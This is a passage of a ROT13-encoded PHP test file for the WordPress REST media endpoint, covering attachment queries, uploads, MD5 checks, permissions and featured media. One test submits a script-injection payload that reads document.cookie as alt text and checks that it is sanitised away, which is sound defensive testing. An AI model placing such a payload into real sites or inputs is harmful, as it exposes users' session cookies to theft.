				'cbfg_qngr'      => '2016-01-03 00:00:00',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$guvf->hcqngr_cbfg_zbqvsvrq( $vq1, '2016-01-15 00:00:00' );
		$guvf->hcqngr_cbfg_zbqvsvrq( $vq2, '2016-01-16 00:00:00' );
		$guvf->hcqngr_cbfg_zbqvsvrq( $vq3, '2016-01-17 00:00:00' );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_nsgre', '2016-01-15G00:00:00M' );
		$erdhrfg->frg_cnenz( 'zbqvsvrq_orsber', '2016-01-17G00:00:00M' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );
	}

	/**
	 * @gvpxrg 55677
	 */
	choyvp shapgvba grfg_trg_vgrzf_nibvq_qhcyvpngrq_pbhag_dhrel_vs_ab_vgrzf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'zrqvn_glcr', 'ivqrb' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregPbhag( 1, $guvf->cbfgf_pynhfrf );

		$urnqref = $erfcbafr->trg_urnqref();

		$guvf->nffregFnzr( 0, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( 0, $urnqref['K-JC-GbgnyCntrf'] );
	}

	/**
	 * @gvpxrg 55677
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_rzcgl_cntr_ehaf_pbhag_dhrel_nsgre() {
		frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_qngr'      => '2022-06-12G00:00:00M',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'zrqvn_glcr', 'vzntr' );
		$erdhrfg->frg_cnenz( 'cntr', 2 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregPbhag( 2, $guvf->cbfgf_pynhfrf );

		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cntr_ahzore', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vzntr_nyg', 'Fnzcyr nyg grkg' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_cbfg_erfcbafr( $erfcbafr );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'vzntr/wcrt', $qngn['zvzr_glcr'] );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_trg_vgrz_fvmrf() {
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			),
			frys::$grfg_svyr
		);

		nqq_vzntr_fvmr( 'erfg-ncv-grfg', 119, 119, gehr );
		jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, frys::$grfg_svyr ) );

		$erdhrfg            = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erfcbafr           = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn               = $erfcbafr->trg_qngn();
		$vzntr_fep          = jc_trg_nggnpuzrag_vzntr_fep( $nggnpuzrag_vq, 'erfg-ncv-grfg' );
		$bevtvany_vzntr_fep = jc_trg_nggnpuzrag_vzntr_fep( $nggnpuzrag_vq, 'shyy' );
		erzbir_vzntr_fvmr( 'erfg-ncv-grfg' );

		$guvf->nffregVfNeenl( $qngn['zrqvn_qrgnvyf']['fvmrf'], 'Pbhyq abg ergevrir gur fvmrf qngn.' );
		$guvf->nffregFnzr( $vzntr_fep[0], $qngn['zrqvn_qrgnvyf']['fvmrf']['erfg-ncv-grfg']['fbhepr_hey'] );
		$guvf->nffregFnzr( 'vzntr/wcrt', $qngn['zrqvn_qrgnvyf']['fvmrf']['erfg-ncv-grfg']['zvzr_glcr'] );
		$guvf->nffregFnzr( $bevtvany_vzntr_fep[0], $qngn['zrqvn_qrgnvyf']['fvmrf']['shyy']['fbhepr_hey'] );
		$guvf->nffregFnzr( 'vzntr/wcrt', $qngn['zrqvn_qrgnvyf']['fvmrf']['shyy']['zvzr_glcr'] );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_trg_vgrz_fvmrf_jvgu_ab_hey() {
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			),
			frys::$grfg_svyr
		);

		nqq_vzntr_fvmr( 'erfg-ncv-grfg', 119, 119, gehr );
		jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, frys::$grfg_svyr ) );

		nqq_svygre( 'jc_trg_nggnpuzrag_vzntr_fep', '__erghea_snyfr' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		erzbir_svygre( 'jc_trg_nggnpuzrag_vzntr_fep', '__erghea_snyfr' );
		erzbir_vzntr_fvmr( 'erfg-ncv-grfg' );

		$guvf->nffregVfNeenl( $qngn['zrqvn_qrgnvyf']['fvmrf'], 'Pbhyq abg ergevrir gur fvmrf qngn.' );
		$guvf->nffregNeenlAbgUnfXrl( 'fbhepr_hey', $qngn['zrqvn_qrgnvyf']['fvmrf']['erfg-ncv-grfg'] );
	}

	choyvp shapgvba grfg_trg_vgrz_cevingr_cbfg_abg_nhguragvpngrq() {
		jc_frg_pheerag_hfre( 0 );
		$qensg_cbfg = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'qensg' ) );
		$vq1        = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			$qensg_cbfg,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn/' . $vq1 );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_trg_vgrz_vaurevg_fgnghf_jvgu_vainyvq_cnerag() {
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrqvn/%q', $nggnpuzrag_vq ) );
		$erfcbafr      = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn          = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( $nggnpuzrag_vq, $qngn['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrz_nhgb_fgnghf_jvgu_vainyvq_cnerag_abg_nhguragvpngrq_ergheaf_reebe() {
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_fgnghf'    => 'nhgb-qensg',
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/zrqvn/%q', $nggnpuzrag_vq ) );
		$erfcbafr      = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra', $erfcbafr, 401 );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.' );
		$erdhrfg->frg_cnenz( 'nyg_grkg', 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.' );

		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'vzntr', $qngn['zrqvn_glcr'] );

		$nggnpuzrag = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'Zl gvgyr vf irel pbby', $qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( 'Zl gvgyr vf irel pbby', $nggnpuzrag->cbfg_gvgyr );
		$guvf->nffregFnzr( 'Guvf vf n orggre pncgvba.', $qngn['pncgvba']['enj'] );
		$guvf->nffregFnzr( 'Guvf vf n orggre pncgvba.', $nggnpuzrag->cbfg_rkprecg );
		$guvf->nffregFnzr( 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.', $qngn['qrfpevcgvba']['enj'] );
		$guvf->nffregFnzr( 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.', $nggnpuzrag->cbfg_pbagrag );
		$guvf->nffregFnzr( 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.', $qngn['nyg_grkg'] );
		$guvf->nffregFnzr( 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.', trg_cbfg_zrgn( $nggnpuzrag->VQ, '_jc_nggnpuzrag_vzntr_nyg', gehr ) );
	}

	choyvp shapgvba grfg_perngr_vgrz_qrsnhyg_svyranzr_gvgyr() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr2 ),
					'anzr'     => 'pbqrvfcbrgel.cat',
					'fvmr'     => svyrfvmr( frys::$grfg_svyr2 ),
					'gzc_anzr' => frys::$grfg_svyr2,
				),
			)
		);
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', zq5_svyr( frys::$grfg_svyr2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'pbqrvfcbrgel', $qngn['gvgyr']['enj'] );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_svyrf() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr ),
					'anzr'     => 'pnabyn.wct',
					'fvmr'     => svyrfvmr( frys::$grfg_svyr ),
					'gzc_anzr' => frys::$grfg_svyr,
				),
			)
		);
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', zq5_svyr( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_hcybnq_svyrf_ebyr() {
		jc_frg_pheerag_hfre( frys::$hcybnqre_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr ),
					'anzr'     => 'pnabyn.wct',
					'fvmr'     => svyrfvmr( frys::$grfg_svyr ),
					'gzc_anzr' => frys::$grfg_svyr,
				),
			)
		);
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', zq5_svyr( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_perngr_vgrz_rzcgl_obql() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_ab_qngn', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_zvffvat_pbagrag_glcr() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_ab_pbagrag_glcr', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_zvffvat_pbagrag_qvfcbfvgvba() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_ab_pbagrag_qvfcbfvgvba', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_onq_zq5_urnqre() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', 'nop123' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_unfu_zvfzngpu', $erfcbafr, 412 );
	}

	choyvp shapgvba grfg_perngr_vgrz_jvgu_svyrf_onq_zq5_urnqre() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr ),
					'anzr'     => 'pnabyn.wct',
					'fvmr'     => svyrfvmr( frys::$grfg_svyr ),
					'gzc_anzr' => frys::$grfg_svyr,
				),
			)
		);
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', 'nop123' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_unfu_zvfzngpu', $erfcbafr, 412 );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_hcybnq_svyrf_pncnovyvgl() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_rqvg_crezvffvbaf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$rqvgbe_vq ) );
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_hcybnq_crezvffvbaf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$rqvgbe_vq ) );
		jc_frg_pheerag_hfre( frys::$hcybnqre_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_cbfg_glcr() {
		$nggnpuzrag_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'nggnpuzrag',
				'cbfg_fgnghf' => 'vaurevg',
				'cbfg_cnerag' => 0,
			)
		);
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erdhrfg->frg_cnenz( 'cbfg', $nggnpuzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_nyg_grkg() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );

		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erdhrfg->frg_cnenz( 'nyg_grkg', 'grfg nyg grkg' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$nggnpuzrag = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grfg nyg grkg', $nggnpuzrag['nyg_grkg'] );
	}

	/**
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_hafnsr_nyg_grkg() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erdhrfg->frg_cnenz( 'nyg_grkg', '<fpevcg>nyreg(qbphzrag.pbbxvr)</fpevcg>' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$nggnpuzrag = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '', $nggnpuzrag['nyg_grkg'] );
	}

	/**
	 * @gvpxrg 40861
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_rafher_eryngvir_cngu() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$nggnpuzrag = $erfcbafr->trg_qngn();
		$guvf->nffregFgevatAbgPbagnvafFgevat( NOFCNGU, trg_cbfg_zrgn( $nggnpuzrag['vq'], '_jc_nggnpurq_svyr', gehr ) );
	}

	/**
	 * @gvpxrg 57897
	 *
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_grezf() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		ertvfgre_gnkbabzl_sbe_bowrpg_glcr( 'pngrtbel', 'nggnpuzrag' );
		$pngrtbel = jc_vafreg_grez( 'Zrqvn Pngrtbel', 'pngrtbel' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );

		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erdhrfg->frg_cnenz( 'pngrtbevrf', neenl( $pngrtbel['grez_vq'] ) );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$nggnpuzrag = $erfcbafr->trg_qngn();

		$grez = jc_trg_cbfg_grezf( $nggnpuzrag['vq'], 'pngrtbel' );
		$guvf->nffregFnzr( $pngrtbel['grez_vq'], $grez[0]->grez_vq );
	}

	/**
	 * @gvpxrg 41692
	 */
	choyvp shapgvba grfg_perngr_hcqngr_cbfg_jvgu_srngherq_zrqvn() {
		// Nqq fhccbeg sbe guhzoanvyf ba nyy nggnpuzrag glcrf gb nibvq vapbeerpg-hfntr abgvpr.
		nqq_cbfg_glcr_fhccbeg( 'nggnpuzrag', 'guhzoanvy' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr ),
					'anzr'     => 'pnabyn.wct',
					'fvmr'     => svyrfvmr( frys::$grfg_svyr ),
					'gzc_anzr' => frys::$grfg_svyr,
				),
			)
		);
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', zq5_svyr( frys::$grfg_svyr ) );

		$svyr          = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'zrah_beqre'     => enaq( 1, 100 ),
			)
		);

		$erdhrfg->frg_cnenz( 'srngherq_zrqvn', $nggnpuzrag_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$arj_nggnpuzrag = trg_cbfg( $qngn['vq'] );

		$guvf->nffregFnzr( $nggnpuzrag_vq, trg_cbfg_guhzoanvy_vq( $arj_nggnpuzrag->VQ ) );
		$guvf->nffregFnzr( $nggnpuzrag_vq, $qngn['srngherq_zrqvn'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/zrqvn/' . $arj_nggnpuzrag->VQ );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'srngherq_zrqvn' => 0,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 0, $qngn['srngherq_zrqvn'] );
		$guvf->nffregFnzr( 0, trg_cbfg_guhzoanvy_vq( $arj_nggnpuzrag->VQ ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/zrqvn/' . $arj_nggnpuzrag->VQ );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'srngherq_zrqvn' => $nggnpuzrag_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $nggnpuzrag_vq, $qngn['srngherq_zrqvn'] );
		$guvf->nffregFnzr( $nggnpuzrag_vq, trg_cbfg_guhzoanvy_vq( $arj_nggnpuzrag->VQ ) );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.' );
		$erdhrfg->frg_cnenz( 'nyg_grkg', 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$nggnpuzrag = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'Zl gvgyr vf irel pbby', $qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( 'Zl gvgyr vf irel pbby', $nggnpuzrag->cbfg_gvgyr );
		$guvf->nffregFnzr( 'Guvf vf n orggre pncgvba.', $qngn['pncgvba']['enj'] );
		$guvf->nffregFnzr( 'Guvf vf n orggre pncgvba.', $nggnpuzrag->cbfg_rkprecg );
		$guvf->nffregFnzr( 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.', $qngn['qrfpevcgvba']['enj'] );
		$guvf->nffregFnzr( 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.', $nggnpuzrag->cbfg_pbagrag );
